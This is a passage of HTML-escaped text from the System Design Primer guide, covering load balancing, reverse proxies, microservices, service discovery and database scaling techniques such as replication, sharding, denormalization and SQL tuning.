href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#layer-7-load-balancing&#34;&gt;Layer 7&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Layer 4 load balancing&lt;/h3&gt; &#xA;&lt;p&gt;Layer 4 load balancers look at info at the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#communication&#34;&gt;transport layer&lt;/a&gt; to decide how to distribute requests. Generally, this involves the source, destination IP addresses, and ports in the header, but not the contents of the packet. Layer 4 load balancers forward network packets to and from the upstream server, performing &lt;a href=&#34;https://www.nginx.com/resources/glossary/layer-4-load-balancing/&#34;&gt;Network Address Translation (NAT)&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Layer 7 load balancing&lt;/h3&gt; &#xA;&lt;p&gt;Layer 7 load balancers look at the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#communication&#34;&gt;application layer&lt;/a&gt; to decide how to distribute requests. This can involve contents of the header, message, and cookies. Layer 7 load balancers terminate network traffic, reads the message, makes a load-balancing decision, then opens a connection to the selected server. For example, a layer 7 load balancer can direct video traffic to servers that host videos while directing more sensitive user billing traffic to security-hardened servers.&lt;/p&gt; &#xA;&lt;p&gt;At the cost of flexibility, layer 4 load balancing requires less time and computing resources than Layer 7, although the performance impact can be minimal on modern commodity hardware.&lt;/p&gt; &#xA;&lt;h3&gt;Horizontal scaling&lt;/h3&gt; &#xA;&lt;p&gt;Load balancers can also help with horizontal scaling, improving performance and availability. Scaling out using commodity machines is more cost efficient and results in higher availability than scaling up a single server on more expensive hardware, called &lt;strong&gt;Vertical Scaling&lt;/strong&gt;. It is also easier to hire for talent working on commodity hardware than it is for specialized enterprise systems.&lt;/p&gt; &#xA;&lt;h4&gt;Disadvantage(s): horizontal scaling&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Scaling horizontally introduces complexity and involves cloning servers &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Servers should be stateless: they should not contain any user-related data like sessions or profile pictures&lt;/li&gt; &#xA;   &lt;li&gt;Sessions can be stored in a centralized data store such as a &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#database&#34;&gt;database&lt;/a&gt; (SQL, NoSQL) or a persistent &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cache&#34;&gt;cache&lt;/a&gt; (Redis, Memcached)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Downstream servers such as caches and databases need to handle more simultaneous connections as upstream servers scale out&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Disadvantage(s): load balancer&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The load balancer can become a performance bottleneck if it does not have enough resources or if it is not configured properly.&lt;/li&gt; &#xA; &lt;li&gt;Introducing a load balancer to help eliminate a single point of failure results in increased complexity.&lt;/li&gt; &#xA; &lt;li&gt;A single load balancer is a single point of failure, configuring multiple load balancers further increases complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/&#34;&gt;NGINX architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.haproxy.org/download/1.2/doc/architecture.txt&#34;&gt;HAProxy architecture guide&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones&#34;&gt;Scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Load_balancing_(computing)&#34;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/resources/glossary/layer-4-load-balancing/&#34;&gt;Layer 4 load balancing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/resources/glossary/layer-7-load-balancing/&#34;&gt;Layer 7 load balancing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://docs.aws.amazon.com/elasticloadbalancing/latest/classic/elb-listener-config.html&#34;&gt;ELB listener config&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Reverse proxy (web server)&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/n41Azff.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://upload.wikimedia.org/wikipedia/commons/6/67/Reverse_proxy_h2g2bob.svg&#34;&gt;Source: Wikipedia&lt;/a&gt;&lt;/i&gt; &lt;br&gt; &lt;/p&gt; &#xA;&lt;p&gt;A reverse proxy is a web server that centralizes internal services and provides unified interfaces to the public. Requests from clients are forwarded to a server that can fulfill it before the reverse proxy returns the server&#39;s response to the client.&lt;/p&gt; &#xA;&lt;p&gt;Additional benefits include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Increased security&lt;/strong&gt; - Hide information about backend servers, blacklist IPs, limit number of connections per client&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Increased scalability and flexibility&lt;/strong&gt; - Clients only see the reverse proxy&#39;s IP, allowing you to scale servers or change their configuration&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;SSL termination&lt;/strong&gt; - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Removes the need to install &lt;a href=&#34;https://en.wikipedia.org/wiki/X.509&#34;&gt;X.509 certificates&lt;/a&gt; on each server&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Compression&lt;/strong&gt; - Compress server responses&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Caching&lt;/strong&gt; - Return the response for cached requests&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Static content&lt;/strong&gt; - Serve static content directly &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;HTML/CSS/JS&lt;/li&gt; &#xA;   &lt;li&gt;Photos&lt;/li&gt; &#xA;   &lt;li&gt;Videos&lt;/li&gt; &#xA;   &lt;li&gt;Etc&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Load balancer vs reverse proxy&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Deploying a load balancer is useful when you have multiple servers. Often, load balancers route traffic to a set of servers serving the same function.&lt;/li&gt; &#xA; &lt;li&gt;Reverse proxies can be useful even with just one web server or application server, opening up the benefits described in the previous section.&lt;/li&gt; &#xA; &lt;li&gt;Solutions such as NGINX and HAProxy can support both layer 7 reverse proxying and load balancing.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Disadvantage(s): reverse proxy&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Introducing a reverse proxy results in increased complexity.&lt;/li&gt; &#xA; &lt;li&gt;A single reverse proxy is a single point of failure, configuring multiple reverse proxies (ie a &lt;a href=&#34;https://en.wikipedia.org/wiki/Failover&#34;&gt;failover&lt;/a&gt;) further increases complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/resources/glossary/reverse-proxy-vs-load-balancer/&#34;&gt;Reverse proxy vs load balancer&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/&#34;&gt;NGINX architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.haproxy.org/download/1.2/doc/architecture.txt&#34;&gt;HAProxy architecture guide&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Reverse_proxy&#34;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Application layer&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/yB5SYwm.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://lethain.com/introduction-to-architecting-systems-for-scale/#platform_layer&#34;&gt;Source: Intro to architecting systems for scale&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Separating out the web layer from the application layer (also known as platform layer) allows you to scale and configure both layers independently. Adding a new API results in adding application servers without necessarily adding additional web servers. The &lt;strong&gt;single responsibility principle&lt;/strong&gt; advocates for small and autonomous services that work together. Small teams with small services can plan more aggressively for rapid growth.&lt;/p&gt; &#xA;&lt;p&gt;Workers in the application layer also help enable &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#asynchronism&#34;&gt;asynchronism&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Microservices&lt;/h3&gt; &#xA;&lt;p&gt;Related to this discussion are &lt;a href=&#34;https://en.wikipedia.org/wiki/Microservices&#34;&gt;microservices&lt;/a&gt;, which can be described as a suite of independently deployable, small, modular services. Each service runs a unique process and communicates through a well-defined, lightweight mechanism to serve a business goal. &lt;sup&gt;&lt;a href=&#34;https://smartbear.com/learn/api-design/what-are-microservices&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt; &#xA;&lt;p&gt;Pinterest, for example, could have the following microservices: user profile, follower, feed, search, photo upload, etc.&lt;/p&gt; &#xA;&lt;h3&gt;Service Discovery&lt;/h3&gt; &#xA;&lt;p&gt;Systems such as &lt;a href=&#34;https://www.consul.io/docs/index.html&#34;&gt;Consul&lt;/a&gt;, &lt;a href=&#34;https://coreos.com/etcd/docs/latest&#34;&gt;Etcd&lt;/a&gt;, and &lt;a href=&#34;http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper&#34;&gt;Zookeeper&lt;/a&gt; can help services find each other by keeping track of registered names, addresses, and ports. &lt;a href=&#34;https://www.consul.io/intro/getting-started/checks.html&#34;&gt;Health checks&lt;/a&gt; help verify service integrity and are often done using an &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#hypertext-transfer-protocol-http&#34;&gt;HTTP&lt;/a&gt; endpoint. Both Consul and Etcd have a built in &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#key-value-store&#34;&gt;key-value store&lt;/a&gt; that can be useful for storing config values and other shared data.&lt;/p&gt; &#xA;&lt;h3&gt;Disadvantage(s): application layer&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Adding an application layer with loosely coupled services requires a different approach from an architectural, operations, and process viewpoint (vs a monolithic system).&lt;/li&gt; &#xA; &lt;li&gt;Microservices can add complexity in terms of deployments and operations.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://lethain.com/introduction-to-architecting-systems-for-scale&#34;&gt;Intro to architecting systems for scale&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview&#34;&gt;Crack the system design interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Service-oriented_architecture&#34;&gt;Service oriented architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.slideshare.net/sauravhaloi/introduction-to-apache-zookeeper&#34;&gt;Introduction to Zookeeper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cloudncode.wordpress.com/2016/07/22/msa-getting-started/&#34;&gt;Here&#39;s what you need to know about building microservices&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Database&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/Xkm5CXz.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=kKjm4ehYiMs&#34;&gt;Source: Scaling up to your first 10 million users&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Relational database management system (RDBMS)&lt;/h3&gt; &#xA;&lt;p&gt;A relational database like SQL is a collection of data items organized in tables.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;ACID&lt;/strong&gt; is a set of properties of relational database &lt;a href=&#34;https://en.wikipedia.org/wiki/Database_transaction&#34;&gt;transactions&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Atomicity&lt;/strong&gt; - Each transaction is all or nothing&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - Any transaction will bring the database from one valid state to another&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - Executing transactions concurrently has the same results as if the transactions were executed serially&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Durability&lt;/strong&gt; - Once a transaction has been committed, it will remain so&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;There are many techniques to scale a relational database: &lt;strong&gt;master-slave replication&lt;/strong&gt;, &lt;strong&gt;master-master replication&lt;/strong&gt;, &lt;strong&gt;federation&lt;/strong&gt;, &lt;strong&gt;sharding&lt;/strong&gt;, &lt;strong&gt;denormalization&lt;/strong&gt;, and &lt;strong&gt;SQL tuning&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Master-slave replication&lt;/h4&gt; &#xA;&lt;p&gt;The master serves reads and writes, replicating writes to one or more slaves, which serve only reads. Slaves can also replicate to additional slaves in a tree-like fashion. If the master goes offline, the system can continue to operate in read-only mode until a slave is promoted to a master or a new master is provisioned.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/C9ioGtn.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): master-slave replication&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Additional logic is needed to promote a slave to a master.&lt;/li&gt; &#xA; &lt;li&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#disadvantages-replication&#34;&gt;Disadvantage(s): replication&lt;/a&gt; for points related to &lt;strong&gt;both&lt;/strong&gt; master-slave and master-master.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Master-master replication&lt;/h4&gt; &#xA;&lt;p&gt;Both masters serve reads and writes and coordinate with each other on writes. If either master goes down, the system can continue to operate with both reads and writes.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/krAHLGg.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): master-master replication&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You&#39;ll need a load balancer or you&#39;ll need to make changes to your application logic to determine where to write.&lt;/li&gt; &#xA; &lt;li&gt;Most master-master systems are either loosely consistent (violating ACID) or have increased write latency due to synchronization.&lt;/li&gt; &#xA; &lt;li&gt;Conflict resolution comes more into play as more write nodes are added and as latency increases.&lt;/li&gt; &#xA; &lt;li&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#disadvantages-replication&#34;&gt;Disadvantage(s): replication&lt;/a&gt; for points related to &lt;strong&gt;both&lt;/strong&gt; master-slave and master-master.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Disadvantage(s): replication&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;There is a potential for loss of data if the master fails before any newly written data can be replicated to other nodes.&lt;/li&gt; &#xA; &lt;li&gt;Writes are replayed to the read replicas. If there are a lot of writes, the read replicas can get bogged down with replaying writes and can&#39;t do as many reads.&lt;/li&gt; &#xA; &lt;li&gt;The more read slaves, the more you have to replicate, which leads to greater replication lag.&lt;/li&gt; &#xA; &lt;li&gt;On some systems, writing to the master can spawn multiple threads to write in parallel, whereas read replicas only support writing sequentially with a single thread.&lt;/li&gt; &#xA; &lt;li&gt;Replication adds more hardware and additional complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Source(s) and further reading: replication&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Multi-master_replication&#34;&gt;Multi-master replication&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Federation&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/U3qV33e.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=kKjm4ehYiMs&#34;&gt;Source: Scaling up to your first 10 million users&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Federation (or functional partitioning) splits up databases by function. For example, instead of a single, monolithic database, you could have three databases: &lt;strong&gt;forums&lt;/strong&gt;, &lt;strong&gt;users&lt;/strong&gt;, and &lt;strong&gt;products&lt;/strong&gt;, resulting in less read and write traffic to each database and therefore less replication lag. Smaller databases result in more data that can fit in memory, which in turn results in more cache hits due to improved cache locality. With no single central master serializing writes you can write in parallel, increasing throughput.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): federation&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Federation is not effective if your schema requires huge functions or tables.&lt;/li&gt; &#xA; &lt;li&gt;You&#39;ll need to update your application logic to determine which database to read and write.&lt;/li&gt; &#xA; &lt;li&gt;Joining data from two databases is more complex with a &lt;a href=&#34;http://stackoverflow.com/questions/5145637/querying-data-by-joining-two-tables-in-two-database-on-different-servers&#34;&gt;server link&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Federation adds more hardware and additional complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Source(s) and further reading: federation&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=kKjm4ehYiMs&#34;&gt;Scaling up to your first 10 million users&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Sharding&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/wU8x5Id.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Sharding distributes data across different databases such that each database can only manage a subset of the data. Taking a users database as an example, as the number of users increases, more shards are added to the cluster.&lt;/p&gt; &#xA;&lt;p&gt;Similar to the advantages of &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#federation&#34;&gt;federation&lt;/a&gt;, sharding results in less read and write traffic, less replication, and more cache hits. Index size is also reduced, which generally improves performance with faster queries. If one shard goes down, the other shards are still operational, although you&#39;ll want to add some form of replication to avoid data loss. Like federation, there is no single central master serializing writes, allowing you to write in parallel with increased throughput.&lt;/p&gt; &#xA;&lt;p&gt;Common ways to shard a table of users is either through the user&#39;s last name initial or the user&#39;s geographic location.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): sharding&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You&#39;ll need to update your application logic to work with shards, which could result in complex SQL queries.&lt;/li&gt; &#xA; &lt;li&gt;Data distribution can become lopsided in a shard. For example, a set of power users on a shard could result in increased load to that shard compared to others. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Rebalancing adds additional complexity. A sharding function based on &lt;a href=&#34;http://www.paperplanes.de/2011/12/9/the-magic-of-consistent-hashing.html&#34;&gt;consistent hashing&lt;/a&gt; can reduce the amount of transferred data.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Joining data from multiple shards is more complex.&lt;/li&gt; &#xA; &lt;li&gt;Sharding adds more hardware and additional complexity.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Source(s) and further reading: sharding&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://highscalability.com/blog/2009/8/6/an-unorthodox-approach-to-database-design-the-coming-of-the.html&#34;&gt;The coming of the shard&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Shard_(database_architecture)&#34;&gt;Shard database architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.paperplanes.de/2011/12/9/the-magic-of-consistent-hashing.html&#34;&gt;Consistent hashing&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Denormalization&lt;/h4&gt; &#xA;&lt;p&gt;Denormalization attempts to improve read performance at the expense of some write performance. Redundant copies of the data are written in multiple tables to avoid expensive joins. Some RDBMS such as &lt;a href=&#34;https://en.wikipedia.org/wiki/PostgreSQL&#34;&gt;PostgreSQL&lt;/a&gt; and Oracle support &lt;a href=&#34;https://en.wikipedia.org/wiki/Materialized_view&#34;&gt;materialized views&lt;/a&gt; which handle the work of storing redundant information and keeping redundant copies consistent.&lt;/p&gt; &#xA;&lt;p&gt;Once data becomes distributed with techniques such as &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#federation&#34;&gt;federation&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#sharding&#34;&gt;sharding&lt;/a&gt;, managing joins across data centers further increases complexity. Denormalization might circumvent the need for such complex joins.&lt;/p&gt; &#xA;&lt;p&gt;In most systems, reads can heavily outnumber writes 100:1 or even 1000:1. A read resulting in a complex database join can be very expensive, spending a significant amount of time on disk operations.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): denormalization&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Data is duplicated.&lt;/li&gt; &#xA; &lt;li&gt;Constraints can help redundant copies of information stay in sync, which increases complexity of the database design.&lt;/li&gt; &#xA; &lt;li&gt;A denormalized database under heavy write load might perform worse than its normalized counterpart.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h6&gt;Source(s) and further reading: denormalization&lt;/h6&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Denormalization&#34;&gt;Denormalization&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;SQL tuning&lt;/h4&gt; &#xA;&lt;p&gt;SQL tuning is a broad topic and many &lt;a href=&#34;https://www.amazon.com/s/ref=nb_sb_noss_2?url=search-alias%3Daps&amp;amp;field-keywords=sql+tuning&#34;&gt;books&lt;/a&gt; have been written as reference.&lt;/p&gt; &#xA;&lt;p&gt;It&#39;s important to &lt;strong&gt;benchmark&lt;/strong&gt; and &lt;strong&gt;profile&lt;/strong&gt; to simulate and uncover bottlenecks.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Benchmark&lt;/strong&gt; - Simulate high-load situations with tools such as &lt;a href=&#34;http://httpd.apache.org/docs/2.2/programs/ab.html&#34;&gt;ab&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Profile&lt;/strong&gt; - Enable tools such as the &lt;a href=&#34;http://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html&#34;&gt;slow query log&lt;/a&gt; to help track performance issues.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Benchmarking and profiling might point you to the following optimizations.&lt;/p&gt; &#xA;&lt;h5&gt;Tighten up the schema&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;MySQL dumps to disk in contiguous blocks for fast access.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;CHAR&lt;/code&gt; instead of &lt;code&gt;VARCHAR&lt;/code&gt; for fixed-length fields. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;CHAR&lt;/code&gt; effectively allows for fast, random access, whereas with &lt;code&gt;VARCHAR&lt;/code&gt;, you must find the end of a string before moving onto the next one.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;TEXT&lt;/code&gt; for large blocks of text such as blog posts. &lt;code&gt;TEXT&lt;/code&gt; also allows for boolean searches. Using a &lt;code&gt;TEXT&lt;/code&gt; field results in storing a pointer on disk that is used to locate the text block.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;INT&lt;/code&gt; for larger numbers up to 2^32 or 4 billion.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;DECIMAL&lt;/code&gt; for currency to avoid floating point representation errors.&lt;/li&gt; &#xA; &lt;li&gt;Avoid storing large &lt;code&gt;BLOBS&lt;/code&gt;, store the location of where to get the object instead.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;VARCHAR(255)&lt;/code&gt; is the largest number of characters that can be counted in an 8 bit number, often maximizing the use of a byte in some RDBMS.&lt;/li&gt; &#xA; &lt;li&gt;Set the &lt;code&gt;NOT NULL&lt;/code&gt; constraint where applicable to &lt;a href=&#34;http://stackoverflow.com/questions/1017239/how-do-null-values-affect-performance-in-a-database-search&#34;&gt;improve search performance&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Use good indices&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Columns that you are querying (&lt;code&gt;SELECT&lt;/code&gt;, &lt;code&gt;GROUP BY&lt;/code&gt;, &lt;code&gt;ORDER BY&lt;/code&gt;, &lt;code&gt;JOIN&lt;/code&gt;) could be faster with indices.&lt;/li&gt; &#xA; &lt;li&gt;Indices are usually represented as self-balancing &lt;a href=&#34;https://en.wikipedia.org/wiki/B-tree&#34;&gt;B-tree&lt;/a&gt; that keeps data sorted and allows searches, sequential access, insertions, and deletions in logarithmic time.&lt;/li&gt; &#xA; &lt;li&gt;Placing an index can keep the data in memory, requiring more space.&lt;/li&gt; &#xA; &lt;li&gt;Writes could also be slower since the index also needs to be updated.&lt;/li&gt; &#xA; &lt;li&gt;When loading large amounts of data, it might be faster to disable indices, load the data, then rebuild the indices.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Avoid expensive joins&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#denormalization&#34;&gt;Denormalize&lt;/a&gt; where performance demands it.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Partition tables&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Break up a table by putting hot spots in a separate table to help keep it in memory.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Tune the query cache&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In some cases, the &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/query-cache.html&#34;&gt;query cache&lt;/a&gt; could lead to &lt;a href=&#34;https://www.percona.com/blog/2016/10/12/mysql-5-7-performance-tuning-immediately-after-installation/&#34;&gt;performance issues&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Source(s) and further reading: SQL tuning&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://aiddroid.com/10-tips-optimizing-mysql-queries-dont-suck/&#34;&gt;Tips for optimizing MySQL 